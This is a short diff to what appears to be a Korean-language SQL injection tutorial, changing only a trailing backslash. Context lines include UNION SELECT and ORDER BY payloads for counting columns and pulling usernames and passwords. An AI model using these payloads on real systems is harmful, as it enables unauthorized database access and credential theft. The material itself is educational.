@@ -158,7 +158,7 @@ SELECT title, content FROM products WHERE id = '1' UNION SELECT username, passwo
 ' ORDER BY 3 -- -
 ' ORDER BY 4 -- -
 ```
-`ORDER BY 3` 까지는 정상적으로 동작하고 `ORDER BY 4`에서 에러가 나면 -> **컬럼은 3개**라는 뜻임\
+`ORDER BY 3` 까지는 정상적으로 동작하고 `ORDER BY 4`에서 에러가 나면 -> **컬럼은 3개**라는 뜻임
 
 다른 방법으로는 `UNION SELECT NULL` 을 하나씩 늘려가며 확인
 ```
